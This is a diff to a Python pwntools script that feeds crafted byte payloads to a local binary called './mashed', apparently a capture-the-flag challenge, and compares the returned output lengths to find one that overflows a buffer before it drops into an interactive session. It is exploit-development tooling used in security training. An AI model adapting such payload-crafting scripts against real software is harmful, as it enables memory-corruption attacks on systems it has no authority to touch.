@@ -2,41 +2,51 @@ from pwn import *
 p = process('./mashed')
 
 def en(len, text):
-	print p.recvuntil('Select :')
+	r = p.recvuntil('Select :')
 	p.sendline('2')
-	print p.recvuntil('length:')
+	r = p.recvuntil('length:')
 	p.sendline(str(len))
-	print p.recvuntil(':')
+	r = p.recvuntil(':')
 	p.sendline(text)
 	rdata = p.recvuntil('byte')
-	print rdata
 	rdata = rdata.split(' ')
 	return int(rdata[1])
 
-'''
-cut 0,'\n'
-x1x2x3	0\n0
-251 
-'''
 l = []
 for i in range(256):
 	if i == 0x9c or i == 0 or chr(i) == '\n' or chr(i) == 'x':
 		continue
 	l.append(i)
+choice = 'ee'
 ll = []
 res = 0
 for magic in l:
 	payload  = ''
-	for i in range(251):
+	i = 0
+	c = 0
+	while True:
+		if l[i] == magic:
+			i += 1
+			continue
 		payload += chr(magic) + chr(l[i])
-	payload += '\x00'
-	nres = en(0x200 - 8 + 2, payload)
-	ll.append(nres)
-	if res == 0:
-		res = nres
-	elif nres > res:
-		print 'found', magic 
-		raw_input("jdkfjksdjfklsdj")
-		break
+		i += 1
+		c += 1
+		if c == 251:
+			break
+	payload += chr( l[251] )
+	nres = en(506, payload)
+
+	payload += '\n' + '\x00'
+	ans = ''
+	for ch in payload:
+		ans += '\\x' + ch.encode('hex')
+	print ans
+	print 'res: ', nres
+	if choice != 'go':
+		choice = raw_input()
+	
+		
+	ll.append( nres )
 print ll
+print min(ll)
 p.interactive()
